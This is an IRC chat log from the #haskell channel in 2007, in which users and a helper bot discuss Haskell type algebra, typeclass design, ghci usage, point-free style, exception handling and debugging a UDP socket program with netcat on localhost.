07:33:54 <int-e> Saizan: although, writing A&A for the antidiagonal, T&T = (2+T^2)&(2+T^2) = 2&2 + 2 x T^2 + T^2 x 2 + T^2&T^2 = 2&2 + 2xT^2 + T^2x2 + (T&T)xTxT + TxTx(T&T) + (T&T)x(T&T)
07:34:09 <smoofra> Saizan: that's too bad.  It seems like it could be supported inside the language.
07:34:45 <int-e> Saizan: which corresponds to an ADT with 6 constructors, it's a bit messy.
07:35:28 <int-e> Saizan: I could've reused the pair-antidiagonal from the article for three of them though.
07:37:00 <int-e> Saizan: I'm sorry. The TxT should be just T (corresponding to both T being equal) - my ADT had it correct.
07:37:19 <Saizan> int-e: ah!
07:37:31 <Saizan> int-e: i was checking my calculations on that
07:38:51 <Saizan> so it reduces to T&T = 2 + 4T^2 + 2T(T&T) (T&T)^2
07:39:21 <int-e> you're missing a +, but yeah.
07:39:34 <Saizan> what 4T^2 means?
07:39:55 <int-e> T^2 = TxT (a normal pair)
07:39:58 <Saizan> or better, which situation does it represent?
07:40:26 <int-e> it represents the case that one tree is a leaf and the other is a fork, or vice versa.
07:41:17 <Saizan> so a bool for deciding which, and a bool for storing the value in the leaf?
07:41:46 <int-e> yep. I had two constructors and a bool in each.
07:41:59 <int-e> (the construction is more systematic that way)
07:42:30 <hpaste>  int-e pasted "antidiagonal of BoolTree" at http://hpaste.org/2610
07:45:37 <Saizan> int-e: ok, thanks :)
07:46:48 <int-e> Saizan: note that you can replace the last three constructors by  AFF (Pair' BoolTree BoolTree ABoolTree ABoolTree)
07:50:00 <Saizan> int-e: yeah, and in fact those terms derive from (T^2)&(T^2)
07:50:20 <int-e> yep
08:04:27 <CosmicRay> has anyone written a typeclass that lets you use lists, bytestreams, lazy bytestreams, etc. with a unified interface?
08:05:27 <mnislaih> CosmicRay: would monoid work ?
08:06:33 <CosmicRay> well, I don't think so.  I don't believe it defines enough to define tools like fold, head, etc. over it.
08:07:53 <mnislaih> Monoid + Data.Foldable then
08:09:09 <CosmicRay> hm.  I am still not convinced that is enough, at least not to permit a great deal of efficiency.  otherwise why would dons have reimplemented the entire interface?
08:10:12 <mnislaih> well, you didn't originally ask for efficiency
08:10:17 <CosmicRay> true
08:10:37 <CosmicRay> while I suppose one could emulate head or tail with a fold, it smells ugly to me.
08:11:21 <osfameron> for tail it probably wouldn't be any less efficient would it?
08:12:02 <CosmicRay> I suppose perhaps even with head, if laziness could be done right.
08:12:03 <CosmicRay> hm.
08:12:12 <int-e> foldr1 const == head
08:12:29 <Saizan> you can't write tail with a fold if you don't know how to reconstruct your type
08:12:31 <int-e> tail is ugly, with fold you would reconstruct the whole list.
08:13:41 <mrd> you really need views to make this seamless
08:14:06 <osfameron> views?
08:14:07 <mnislaih> you can define tail if you have mempty
08:14:35 <int-e> views or equivalently, an equivalent of 'tails'
08:14:58 <Saizan> mnislaih: how?
08:15:29 <mnislaih> not really mempty, but Monoid. Just get the tail of the list of elements inside and rebuild using mconcat
08:15:39 <mrd> osfameron: patterns using views can match view-implementing data-types as if they were like lists, for example
08:15:48 <Saizan> ?type mconcat
08:15:52 <rahaskella> forall a. (Monoid a) => [a] -> a
08:16:10 <Saizan> the elements are not Monoid, the structure is, no?
08:16:16 <mnislaih> oh, you need singleton too
08:16:39 <mnislaih> or, start with mempty and mappend all the elements
08:16:54 <mnislaih> ah, no
08:17:05 <Saizan> you still need singleton
08:17:06 <mnislaih> you need singleton
08:17:12 <osfameron> mrd: ah, ok, I don't know what views are, I'll look into it at some point :-)
08:18:26 <Saizan> an uncons primitive would probably be quite useful here
08:22:02 <vincenz_> > 200 * 365 * 24 * 3600 * 3600 * 1000000
08:22:04 <rahaskella>  22705920000000000000
08:22:33 <vincenz_> > 2^53
08:22:35 <rahaskella>  9007199254740992
08:26:38 <ptolomy> I've often wondered.. is there an easy and efficient way to do case insensitive matches with Parsec? Is it just a matter of chaining a bunch of ('Z' <|> 'z')-ish things?
08:26:41 <roconnor> @ go 200 year days in milliseconds^2
08:26:45 <roconnor> @go 200 year days in milliseconds^2
08:26:46 <rahaskella> 200 year days = 5.45303681 x 10^20 milliseconds^2
08:27:01 <roconnor> hmm
08:27:14 <roconnor> vincenz_: what are you doing?
08:27:21 <vincenz_> roconnor: nothing
08:28:45 <roconnor> @go 200 year hourss in milliseconds^2
08:28:47 <rahaskella> http://www.nikhef.nl/pub/services/biblio/bib_KR/sciam14327037.pdf
08:28:50 <roconnor> @go 200 year hours in milliseconds^2
08:28:51 <rahaskella> 200 year hours = 2.27209867 x 10^19 milliseconds^2
08:29:01 <vincenz_> @go 200 years in microseconds
08:29:02 <rahaskella> 200 years = 6.31138519 x 10^15 microseconds
08:29:27 <roconnor> vincenz_: I think mine is correct
08:29:40 <roconnor> it just has a different number of days per year than you calculated.
08:29:42 <vincenz_> roconnor: eh?
08:29:57 <roconnor> @go 200 year hours in milliseconds^2
08:29:58 <rahaskella> 200 year hours = 2.27209867 x 10^19 milliseconds^2
08:30:10 <roconnor> @go 200 * 365 * 24 * 3600 * 3600 * 1000000 milliseconds^2
08:30:10 <rahaskella> 200 * 365 * 24 * 3,600 * 3,600 * (1,000,000 (milliseconds^2)) = 2.270592 x 10^13 s^2
08:30:21 <byorgey> @go 1 year in days
08:30:21 <roconnor> oh crap
08:30:22 <rahaskella> 1 year = 365.242199 days
08:30:32 <roconnor> off by a factor of a million.
08:31:04 <roconnor> oh wait the units are wrong
08:31:10 <roconnor> @go 200 * 365 * 24 * 3600 * 3600 * 1000000 milliseconds^2 in milliseconds^2
08:31:11 <rahaskella> 200 * 365 * 24 * 3,600 * 3,600 * (1,000,000 (milliseconds^2)) = 2.270592 x 10^19 milliseconds^2
08:31:15 <roconnor> there we go.
08:31:57 <byorgey> now the question is, what are square milliseconds?
08:32:18 <psykotic> regarding ptolemy's question, i wonder if the easiest way would be to just do a String newtype with a case insensitive Eq implementation
08:32:25 <psykotic> unfortunately he already left
08:32:51 <mrd> hm google uses a value close to the tropical year length for year in days.
08:33:10 <roconnor> @go 1 millisecond^2 in miles / G
08:33:12 <rahaskella> http://www.em.gov.bc.ca/DL/ArisReports/02244.PDF
08:33:17 <roconnor> @go 1 millisecond^2 in miles / G-force
08:33:20 <rahaskella> http://www.bautforum.com/space-exploration/63933-what-maximum-g-force-probe-can-withstand.html
08:33:22 <roconnor> :?
08:35:29 <roconnor> @go 1 millisecond^2 in miles / g
08:35:30 <rahaskella> 1 (millisecond^2) = 6.0935698 x 10^-9 miles / g
08:35:37 <roconnor> byorgey: there you go.
08:35:53 <byorgey> ah, yes, that helps. =P
08:36:39 <mrd> @go 1 electron volt in nanograms
08:36:43 <rahaskella> http://www.chem.canterbury.ac.nz/Let's%20Talk%20Chemistry/PaperVersion/ManSEC07.pdf
08:37:50 <roconnor> @go 1 electron volt/c^2 in nanograms
08:37:51 <rahaskella> (1 electron volt) / (c^2) = 1.78266173 x 10^-24 nanograms
08:38:07 <roconnor> e = mc^2
08:38:36 <mrd> blah, do i have to explain that to google
08:38:45 <roconnor> :)
08:38:48 <mrd> I thought it was smart!
08:43:32 <alpha_q> hey. I'm new to haskell and I was wondering. Can I use ghci as an interpreter which would work like that: "ghci <options?> file.hs" and that will result in ghci executing it and exiting
08:43:46 <alpha_q> without starting its own command line
08:43:50 <mrd> no that will load it into ghci
08:43:59 <mrd> what you want is runghc
08:44:11 <mrd> or you can compile your program with ghc
08:44:23 <alpha_q> oh runghc seems like just what i need
08:44:24 <alpha_q> thanks
08:44:45 <mrd> though for development purposes, ghci is probably your best bet
08:45:02 <roconnor> runhaskell is more portable than runghc ;)
08:45:52 <alpha_q> well I doubt that I'll make something serious soon. I need this just to test my first attempts only on my pc
08:46:23 <mrd> ghci allows you to test functions and reload your file interactively, which is a lot nicer than trying to test the whole shebang at once
08:46:29 <ari> alpha_q: You can also load files with :l in ghci and reload them with :a or just :
08:46:47 <alpha_q> well yeah, but I'm kinda used to using scite
08:47:02 <mrd> what is scite?
08:47:12 <alpha_q> an editor/environment
08:47:18 <alpha_q> for various languages
08:47:26 <mrd> well you keep your editor open in one window, and then reload your file after you change it
08:47:40 <alpha_q> in scite I can set a command line to be associated on command "run" for hs files
08:47:43 <psykotic> scite is pretty much tapped notepad.exe with syntax highlighting :)
08:47:52 <psykotic> tabbed, sorry
08:48:07 <alpha_q> and making the command line "runghc  ..." looks perfect
08:48:11 * psykotic hates it with a passion
08:48:18 <alpha_q> psykotic it has commands
08:48:23 <mrd> alpha_q: well, your choice.  just pointing out that it's not the best way.
08:48:28 <alpha_q> run, compile, comment-out
08:48:59 <alpha_q> probably it isn't the best way for making something big, but for my experience short programs are best done with scite
08:49:14 * psykotic just uses one editor for everything
08:49:29 * monochrom uses every editor for one thing
08:49:30 <psykotic> i wonder if emacs has an uptime command. i'm pretty sure my current instance has been running for a few months.
08:49:40 <alpha_q> I use two... scite and ms devenv :)
08:50:40 <roconnor> alpha_q: in haskell, one often writes a library of functions that are tested individually at the ghci prompt, rather than using an actualy executable test harness.
08:51:03 <alpha_q> fair enough
08:51:12 <roconnor> alpha_q: all in good time I guess.
08:51:19 <alpha_q> if I write a library of functions I'll test it with the ghci prompt
08:51:34 <alpha_q> but I haven't written a single line of code in haskell yet...
08:51:38 <roconnor> alpha_q: :) I suppose it will take a bit of time to switch paradigms.
08:51:40 <alpha_q> so at first you start small
08:51:46 <gpi5> Hi! To run my program, I'm using 'main = interact (\s -> show (checks s))'. Any other way to write that (without lamba function) ?
08:51:54 <mrd> > map (+2) [1..]
08:51:55 <rahaskella>  [3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,3...
08:52:02 * roconnor remembers my last goto in Pascal after switching from Basic.
08:52:09 <alpha_q> and I think scite is best to start small
08:52:13 <mrd> gpi5: interact (show . checks)
08:52:13 <monochrom> It takes a long time or a big crisis to switch paradigm.
08:52:35 <mrd> @src (.)
08:52:35 <rahaskella> (.) f g x = f (g x)
08:52:36 <roconnor> I remember when I wrote my last goto I swore up and down I needed it.
08:52:44 <roconnor> somehow I doubt I really needed it now.
08:52:45 <ari> What roconnor said doesn't imply it's not a good idea to write your tests in a file, it's just that it's quicker to develop those functions in the first place by testing them from the ghci prompt
08:52:56 <monochrom> I now use recursion.
08:53:06 <roconnor> ari: good point.
08:53:08 <gpi5> Thanks mrd
08:53:10 <monochrom> Sorry, that is a lie. I now use delimited continuations. XD
08:53:27 <roconnor> monochrom: do you really?
08:54:05 <alpha_q> roconnor well the closest to functional programming, that I have gotten is Mathematica
08:54:17 <mrd> I used to use a hammer, but then some of my problems stopped looking like nails.
08:55:20 <alpha_q> ok. thanks for the help, everyone. When I become a haskel guru be sure to see me here again :)
08:55:20 <roconnor> alpha_q: just keep in touch with us for guideance while you learn. :)
08:55:42 <alpha_q> I have a bunch of books recommended to my by a friend
08:55:43 <alpha_q> :)
08:55:59 <mrd> which books?
08:56:09 <alpha_q> and I don't want to bother people with "rtfm questions"
08:56:16 <mrd> (I'm curious because I never bothered with one)
08:56:22 <roconnor> alpha_q: don't worry, we aren't assholes here.
08:56:39 <alpha_q> Graham Hutton: Programming in Haskell
08:56:59 <alpha_q> Simon Thompson: Haskell: The Craft of Functional Programming
08:57:13 <alpha_q> Fethi Rabhi and Guy Lapalme: Algorithms: A functional programming approach
08:57:27 <roconnor> ooh, I didn't realize the craft was written by Simon Thompson.
08:57:41 * mrd never heard of that last one.  anyone check it out?
08:57:43 <roconnor> I have is book on Type Theory and Functional Programming.  It totally rocks.
08:57:45 <phobes> It is in fact written by thompson
08:57:51 <roconnor> s/is/his/
08:58:05 <mrd> alpha_q: also, Haskell.org is a good resource
08:58:07 <EvirDrevo> roconnor: I am just reading that.
08:58:24 <roconnor> EvirDrevo: It's great isn't it :D.  Maybe it's just me.
08:58:26 <alpha_q> yep. I have it open right now
08:58:33 <EvirDrevo> EvirDrevo: Very thrilling, indeed. :-)
08:59:08 <EvirDrevo> roconnor: But I got it from Google, not from a book store.
08:59:13 <EvirDrevo> ttfp.pdf, you'll find it.
08:59:32 <roconnor> EvirDrevo: I bought the book used online before it when up for free on the web.
08:59:34 <mrd> yea I have that pdf around
08:59:40 <roconnor> EvirDrevo: But I'm happy with my purchase :)
08:59:56 <gpi5> And how to rewrite 'checks = (\s -> s == show (readGexpr s))' please?
09:00:02 <mrd> i haven't gotten around to reading it yet though.  perhaps this weekend.  i need to get away from the computer.
09:00:10 <gpi5> (Witout lambda functions)?
09:00:19 <mrd> gpi5: checks s = show (readGexpr s)
09:00:26 <EvirDrevo> roconnor: The online version has some bugs, though. One of the first excercises is to prove "(x -> y) -> (y -> x)"
09:00:27 <mrd> er
09:00:30 <mrd> and the ==
09:00:35 <roconnor> EvirDrevo: :D
09:00:36 <EvirDrevo> roconnor: Which is, err ... strange.
09:00:37 <alpha_q> thanks again to everyone. I'm off to a friday evening right now and tomorrow I'll get all haskelly :) see you!
09:00:41 <mrd> @pl \s -> s == show (readGexpr s)
09:00:42 <rahaskella> ap (==) (show . readGexpr)
09:01:13 <roconnor> checks s = s == show (readGexpr s)
09:01:15 <roconnor> or
09:01:22 <roconnor> checks s = show (readGexpr s) == s
09:01:34 * roconnor thinks the latter reads nicer.
09:01:53 <roconnor> but it should probably be named
09:02:04 <roconnor> prop_something s = show (readGexpr s) == s
09:02:16 <roconnor> so that it can automatically be checked with quickcheck.
09:02:34 <mrd> gpi5: i would not always recommend trying to eliminate explicit parameters, sometimes the result is too confusing.  try out @pl a bit and see ;)
09:03:14 <mrd> though i do like that usage of 'ap' there, might have to start using that for my own stuff
09:03:45 <phobes> > 1 -- is that you rahakella?
09:03:47 <rahaskella>  1
09:04:26 <roconnor> EvirDrevo: are the not signs missing?
09:04:40 <LordBrain> I'm trying to get the hang of network programming and doing it in haskell, Here's a very simple snippet.
09:04:43 <EvirDrevo> roconnor: I've seen negation signs in other parts of the book.
09:04:46 <hpaste>  LordBrain pasted "network snippet" at http://hpaste.org/2611
09:04:53 <EvirDrevo> roconnor: So at least, they are not missing globally.
09:04:58 <EvirDrevo> Maybe in this example...
09:05:14 <mrd> forever doesn't look right
09:05:23 <LordBrain> One thing i notice, is this program hangs, after i give it some input, instead of just exiting
09:05:26 <mrd> x >> forever x
09:05:36 <LordBrain> oh
09:05:41 <LordBrain> thanks
09:05:59 <roconnor> EvirDrevo: I see you are right.
09:06:12 <roconnor> EvirDrevo: i'm surprised it is correct in the print edition.
09:06:36 <LordBrain> ok i fixed that mrd, but the program hasnt changed its behavior
09:06:38 <EvirDrevo> roconnor: There are some other bugs, but mostly from layout, like LaTeX commands that seem to lack an introducing backslash.
09:06:46 <mrd> LordBrain: also, i before e except after c
09:06:55 <EvirDrevo> So they are in the book literally. But I don't remember the page number. :-)
09:06:58 <mrd> ;)
09:07:12 <gpi5> md5: Ok. But does it make a difference after compilation?
09:07:21 <gpi5> It works now, thanks.
09:08:00 <LordBr4in> i got dcd
09:08:29 <mrd> you hit enter to getLine and the program does not exit?
09:08:46 <LordBr4in> correct
09:08:53 <LordBr4in> it prints the string, but it hangs
09:09:40 <mrd> if you then go and send something to the socket does it then exit?
09:09:58 <mrd> gpi5: does what make a difference?
09:10:11 <LordBr4in> well i'm using nc to send to the socet... like so nc -u localhost 25001
09:10:30 <LordBr4in> it has no affect on the program
09:10:38 <LordBr4in> the string i feed into nc never gets printed
09:10:43 <LordBr4in> and it still hangs
09:11:09 <phobes> forkIO creates a new system thread?
09:11:13 <LordBr4in> try it... i'm on cygwin, might be something funky about that
09:11:22 <LordBr4in> phobes, no it shouldnt
09:11:39 <mrd> that is strange. what version are you using.
09:11:43 <mrd> oh cygwin. hm.
09:11:50 <gpi5> mrd: the fact that the code is written with a lambda function or not? (It looks to me like there is one more indirection there, so I don't know how the compiler deals with that).
09:12:08 <LordBr4in> phobes, that is what forkOS is for
09:12:08 <mrd> gpi5: no it does not matter in the final code.  there is a difference to the type-checker, but it doesn't matter in this case.
09:13:19 <LordBr4in> mrd, can you try it where you are, see if it's just some cygwin-funkery
09:13:27 <mrd> well on linux it exits
09:13:35 <LordBr4in> ok, does it print the string?
09:13:37 <mrd> i'm not getting any output though
09:13:44 <gpi5> Btw, does someone know whether there a big difference in complexity between a C++ and Haskell compiler?
09:14:27 <mrd> well, Haskell has a real type system.  But C++ has a lot of crazy cruft.
09:15:09 <pjd> they're probably complex in different ways
09:15:22 <LordBr4in> yeah, you need some measure of complexity
09:15:27 <pjd> and it obviously depends on the specific compiler implementations in question
09:16:05 <gpi5> Ok, I see, was a stupid question :)
09:16:09 <mrd> LordBr4in: did you try System.Exit.exitWith btw
09:16:53 <LordBr4in> mrd, no... i'll try that, but i'm really more interested in the no-output thing
09:17:20 <mrd> i am doing: echo test | nc -u 127.0.0.1 25001
09:17:24 <mrd> but nothing
09:18:06 <mrd> oh, recvFrom in Network is TCP I think
09:18:18 <LordBr4in> oh...
09:18:26 <mrd> yep that's it
09:18:33 <LordBr4in> :)
09:18:34 <LordBr4in> thnks
09:18:40 * araujo wonders where lambdabot is
09:19:24 <mauke> @bot
09:19:25 <rahaskella> :)
09:19:40 <pjd> is lambdabot ill?
09:19:50 <profmakx> vacation!
09:20:00 <mrd> LordBr4in: recvFrom creates a throw away tcp socket
09:20:01 <pjd> oh, okay
09:20:12 <mrd> lambdabot is probably travelling
09:21:12 <LordBr4in> interesting
09:21:18 <puusorsa> hooray!
09:21:57 <LordBr4in> the System.Exit.exitWith had no affect
09:22:25 <LordBr4in> it just hangs until i Ctrl-c
09:23:53 <dons> rahaskella: @part #haskell
09:23:58 <dons> ?users
09:24:03 <lambdabot> Maximum users seen in #haskell: 402, currently: 390 (97.0%), active: 1 (0.3%)
09:24:38 <dons> good morning #haskell
09:25:08 <byorgey> morning, dons
09:25:59 <LordBrain> good morning dons
09:26:06 <LordBrain> its actually noon here
09:26:18 <dons> ?time
09:26:21 <lambdabot> Local time for dons is Fri Sep  7 09:25:06 2007
09:26:30 <LordBrain> ?time
09:26:31 <lambdabot> Local time for LordBrain is Fri Sep 07 12:26:03
09:26:45 <dons> its not referentially transparent!
09:26:52 <LordBrain> lol
09:27:05 <dons> well, its running in the IRC monad actually, so its not so bad :)
09:27:10 <dons> time is just a monad ;)
09:27:21 <mrd> funny we were just discussing lambdabot
09:27:26 <scandal> you need that on a bumper sticker
09:27:38 <dons> mrd: oh?
09:27:45 <mrd> 12:19 < mrd> lambdabot is probably travelling
09:28:01 <mrd> -3 hours to Pdx time
09:28:01 <dons> oh, dons was travelling, and lambdabot is 8000kms away
09:28:20 <dons> i might task sorear to look after her.
09:29:10 <smoofra> stupid question: how is it that you can use a big stack of monad transformers without a bunch of lifts everywhere?
09:30:04 <kpreid> smoofra: well, liftIO is an example of one way
09:30:16 <LordBrain> @type Network.Sockets.recv
09:30:20 <lambdabot> Couldn't find qualified module.
09:30:21 <LordBrain> @type Network.Socket.recv
09:30:23 <lambdabot> Network.Socket.Socket -> Int -> IO String
09:30:26 <kpreid> smoofra: or for a given stack, you can write your own functions to lift to particular levels
09:30:32 <dons> smoofra: using MonadTrans to abstract over the lifts (or deriving them)
09:30:40 <dons> its a good question :)
09:30:46 <LordBrain> is that Int flags? or is it a buffer size? There's no documentation
09:30:53 <mrd> buffer size
09:31:00 <mrd> see 'man recv' =)
09:31:07 <smoofra> in the example i'm reading they just use things from lower on the stack without any lifts at all
09:31:21 <kpreid> smoofra: then perhaps they're using a typeclass
09:31:41 <dons> you can derive MonadReader/MonadWriter and so on, for different parts of the stack
09:31:42 <kpreid> e.g. consider "liftIO getLine" -- you can use that in any MonadIO
09:31:48 <LordBrain> man recv reports size_t is used for the buffer length, and the last parameter int is used for some kind of flags
09:31:50 <dons> and avoid lifts to call e.g. 'ask' on a lower monad in the stack
09:31:52 <kpreid> also what dons said
09:32:17 <dons> there's some examples in xmonad
09:32:36 <smoofra> so all the things higher on the stack then ReaderT need to define an instance for MonadReader?
09:32:53 <mrd> LordBrain: oh yea, i'm probably wrong
09:33:34 <mrd> nope, testing says that it is length
09:33:46 <byorgey> I just created, built, and installed a new ghc package using cabal... and now I can't load any packages in ghci
09:33:51 <byorgey> it says things like "<no location info>: module `Data.List' is a package module"
09:33:56 <byorgey> any ideas?
09:38:27 <gpi5> I'm using the 'read' function to build a data structure declared by data from a string. But how do I catch excpetions when it cannot be parsed? ('catch' doesn't work).
09:38:44 <kpreid> use reads instead
09:38:46 <kpreid> @type reads
09:38:48 <lambdabot> forall a. (Read a) => String -> [(a, String)]
09:39:00 <kpreid> if it is not parseable the list will be empty
09:39:18 <gpi5> Thanks, I'll give it a try
09:40:25 <Saizan> ?type evaluate
09:40:27 <lambdabot> Not in scope: `evaluate'
09:40:34 <Saizan> ?hoogle evaluate
09:40:34 <lambdabot> Control.Exception.evaluate :: a -> IO a
09:40:34 <lambdabot> Test.QuickCheck.evaluate :: Testable a => a -> Gen Result
09:41:47 <hpaste>  LordBrain pasted "new network snip" at http://hpaste.org/2612
09:42:40 <mrd> LordBrain: you can't circumvent socket like that
09:42:54 <mrd> just calling MkSocket will not invoke socket()
09:43:05 <LordBrain> hmmm
09:43:16 <mrd> instead of status make that sock <- socket ...
09:43:23 <mrd> also your protocol number will be 17, not 0
09:43:31 <mrd> and you need to bindSocket the address
09:44:20 <LordBrain> why 17
09:44:28 <mrd> grep udp /etc/protocols
09:44:37 <byorgey> rey_: my problem above, never mind, I'm a moron =)
09:44:48 <LordBrain> ok
09:44:55 <byorgey> for some strange reason I was trying to load modules with :l instead of :m =)
09:47:10 <hpaste>  mrd annotated "new network snip" with "(no title)" at http://hpaste.org/2612#a1
09:47:39 <gpi5> If I put 'import Control.Exception' then I get 'Ambiguous occurence 'catch' (it is also in Prelude??)
09:48:10 <mrd> yea it happens. just do import Prelude hiding (catch)
09:48:16 <olsner> :t splitAt
09:48:24 <lambdabot> forall a. Int -> [a] -> ([a], [a])
09:49:28 <|Jedai|> I have a program that runs faster interpreted (GHCi) than compiled (with -O or -O2 or no -O), is it ok doctor ?
09:49:57 <Cale> gpi5: If you want to catch errors occurring from read, you'll probably also want to use Control.Exception.evaluate to force the evaluation to occur in sequence with the IO
09:50:14 <Cale> jedai: that's interesting
09:50:25 <jedai> And it's not an infinitesimal thing too, it goes from 16s to 19s
09:50:30 <Cale> jedai: what program?
09:50:40 <jedai> I'll paste it
09:51:12 <mrd> LordBrain: also, PortNum needs to be specified in network byte order.
09:51:25 <gpi5> Cale: Thanks. The exception is in 'pure' code, so I don't think I need an IO ??
09:51:38 <Cale> gpi5: You do if you want to catch the exception
09:51:53 <LordBrain> oh...
09:52:03 <Cale> gpi5: thrown exceptions look the same as an infinite loop to pure code.
09:52:20 <hpaste>  Jedai pasted "Faster interpreted" at http://hpaste.org/2613
09:52:52 <jedai> I use GHC 6.6.1 though, it may be ok with a 6.7
09:53:26 <LordBrain> is there a convenience function already which will convert to network byte order?
09:53:52 <gpi5> Cale: I thought an exception was just an event that would be caught at a higher level in the backtrace? So why would you need to sync that?
09:53:59 <jedai> It's problem38 in project Euler if you want to understand the purpose of the code
09:54:00 <LordBrain> on my machine network byte order must be the same
09:54:31 <dons> dcoutts: re. hotel in Freiburg, looks like we're at Best Western Premier Hotel Victoria
09:54:40 <Cale> gpi5: You could break referential transparency with exceptions if you could catch them with pure functions.
09:55:15 <mrd> Best Western in Germany?
09:55:35 * mrd thought that was States-only
09:55:38 <dons> mrd, yeah, sounds weird.
09:55:56 <dons> yep. http://www.victoria.bestwestern.de/
09:55:58 <lambdabot> Title: Best Western Premier Hotel Victoria, Freiburg im Breisgau, Breisgau, Schwarzwald ...
09:56:02 <mrd> LordBrain: i don't remember offhand
09:56:30 <gpi5> Cale: I don't really understand. But anyway, I need to create an IO even though I don't really need one, right?
09:57:13 <Cale> gpi5: Let me try to remember how it goes
09:58:52 <Cale> jedai: Here, with 6.6, it's 4 times faster when compiled
09:59:03 <mrd> hm, this actually looks like a design flaw in Network.Socket
09:59:11 <shapr> ooh, where?
09:59:13 <jedai> Cale: wich options ?
09:59:23 <roconnor> mrd: that doesn't sound surprising.
09:59:24 <mrd> I don't see a way through the public API to safely create a SockAddr with a proper PortNum
09:59:37 <Cale> jedai: ghc --make -o pan pan.hs
09:59:50 <jedai> Cale: looks like a slight bug in 6.6.1 then, hope it was caught in 6.7
09:59:50 * roconnor maybe the hackathon needs an item - write proper sockects library / api
09:59:53 <mrd> and PortNum(..) is exported, which according to comments, is just meant for use by Network.BSD and not for anyone else
10:00:15 <mrd> well this should be just a one-liner fix.  unless i'm missing something.
10:00:55 <roconnor> mrd: okay, I recall bigger problems :)
10:01:16 <mrd> like exporting intToPortNumber
10:01:30 <roconnor> mrd: like not being able to specify the timeout for a network connection.
10:01:39 <mrd> yea i'm sure, but Network.Socket is supposed to be just a low level direct interface to the C API
10:02:52 <mrd> roconnor: the TTL?
10:04:24 <roconnor> lemme check
10:05:18 <LordBrain> seems like i have to use the FFI to get htonl
10:05:31 <roconnor> mrd: it was SendTimeOut and RecvTimeOut : SocketOption
10:05:38 <roconnor> mrd: they are impossible to use
10:05:42 <roconnor> with the current API.
10:05:46 <jedai> Cale: In fact I was a bit wrong in my description of the problem, I tried to simplify and...
10:06:53 <jedai> Cale: there was only the main function in my program, all the helper functions were in another module (which was compiled with -O2 somewhere along the way)
10:07:16 <mrd> roconnor: why?
10:07:49 <jedai> Cale: I just tried with the version I pasted and it's waayyyy slower interpreted
10:08:47 <jedai> Cale: So I guess it means your test didn't prove anything
10:10:06 <gpi5> How do I use evaluate? I understand it will execute the function, but where is the exception handler supposed to be? Do I also need a catch?
10:10:26 <oerjan> :t evaluate
10:10:29 <lambdabot> Not in scope: `evaluate'
10:10:31 <LordBrain> foreign import ccall unsafe "htonl" htonl :: Word32 -> Word3  --  11:8: parse error on input `import'
10:10:42 <LordBrain> what's the parse error?
10:10:48 <oerjan> @index evaluate
10:10:49 <lambdabot> Control.Exception, Test.QuickCheck, Debug.QuickCheck
10:11:06 <Cale> gpi5: evaluate x is an IO action which will evaluate x up to the top-level constructor (but no further)
10:11:07 <mauke> LordBrain: missing {-# LANGUAGE ForeignFunctionInterface #-}?
10:11:13 <mauke> or -fffi
10:11:13 <jedai> Interestingly, this "integrated" version is as fast as the module version interpreted (and faster than the module version compiled...)
10:11:24 <Cale> gpi5: If that causes an exception, then catch can catch it.
10:11:52 <Cale> gpi5: So you'd have something which looks like catch (evaluate x) (\e -> ...)
10:12:34 <gpi5> Cale: thanks, I'm trying it
10:13:04 <LordBrain> hmmmm
10:13:51 <LordBrain> strange.. if i use {-# OPTIONS -fglasgow-exts #-} then i dont need that, but if i use {-# GHC_OPTIONS -fglasgow-exts #-} then I do...
10:13:58 <roconnor> mrd: because setsockopt wants a void* but the haskell API only allows us to pass an Int.
10:14:42 <mauke> LordBrain: it's OPTIONS_GHC
10:14:50 <LordBrain> lol
10:14:57 <mrd> i was under the impression that it had to be an int anyhow
10:15:21 <LordBrain> mauke, someone should tell this guy too http://comonad.com/haskell/type-int/src/Data/Type/Hex/Stage2.hs
10:15:45 <roconnor> mrd: er sorry, to be more clear: setsockopt wants the void* to point to a timeval structure.
10:16:00 <roconnor> mrd: when the command is seting a timeout value
10:16:20 <roconnor> mrd: such a structure is impossible to make, and impossible to pass.
10:17:07 <roconnor> mrd: at least that is my understanding.  I'm not an expert.
10:18:18 <mrd> ah i misundertood the man page. it says "Most socket-level options utilize an int parameter for optval"
10:19:24 <roconnor> mrd: anyhow, that just goes to show that the whole API is borked.
10:19:30 <roconnor> maybe I exagerate.
10:19:53 <puusorsa> Maybe Just exagerate Nothing
10:20:13 <monochrom> Haha
10:20:52 <mrd> yes.. yes it is.  I wonder if fixes can be snuck in for 6.8
10:21:54 <roconnor> mrd: why when is 6.8 due?
10:22:35 <mrd> this month I think
10:23:22 <roconnor> oh
10:23:32 <roconnor> well, the api has been broken forever
10:23:38 <roconnor> what's another release.
10:23:49 <gpi5> How to transform '\e -> putStr (show e)' into an object of type IO String ??
10:24:01 <roconnor> But I will add it to the hackathong agendaish thing
10:24:05 <mauke> gpi5: er, huh?
10:24:22 <mauke> haha, hackathong
10:25:15 <mrd> gpi5: what you have there is: Show t => t -> IO ()
10:25:53 <xerox> gpi5: that is, you want both to print the string and return it?
10:26:07 <gpi5> xerox: yes!
10:26:12 <LordBrain> putStr (show e) >> return e
10:26:13 <xerox> \xs -> do print xs; return xs
10:26:25 <gpi5> Thanks..
10:26:28 <xerox> NP.
10:26:57 <LordBrain> is this for debugging?
10:27:24 <LordBrain> you can use Debug.Trace
10:28:06 <LordBrain> bbl
10:30:32 <sioraiocht> haskell has ruined me
10:31:00 <puusorsa> hooray!
10:34:02 <stepcut> sioraiocht: yay!
10:34:12 <sioraiocht> no
10:34:18 <sioraiocht> I HAVE to work with other languages
10:34:20 <sioraiocht> it's a reality
10:34:20 <stepcut> @quote sigfpe hate
10:34:20 <lambdabot> No quotes match. Have you considered trying to match wits with a rutabaga?
10:34:22 <sioraiocht> and it makes me SAD
10:34:41 <shapr> sioraiocht: So change that reality.
10:34:44 <sioraiocht> I just decided I will never, ever see eye-to-eye with the lua designers
10:35:01 <stepcut> sioraiocht: it's like the first time you have wine from a bottle, you just can't go back to wine in a box ;)
10:35:54 <mauke> @quote sucks
10:35:55 <lambdabot> roconnor says: life lesson from today: 1 closure is nice, 500 000 closures sucks
10:35:59 <sioraiocht> stepcut: LOL true.  I guess I don't even like imperative or OO programming as much anymore (although I think functional programming has improved my programming in those paradigms)
10:36:34 <oerjan> @users
10:36:35 <lambdabot> Maximum users seen in #haskell: 402, currently: 395 (98.3%), active: 19 (4.8%)
10:38:03 <cizra> What does -> mean?
10:39:11 <EvirDrevo> stepcut: Like beer in plastic bottles... urgh.
10:39:11 <oerjan> cizra: it's used for several things
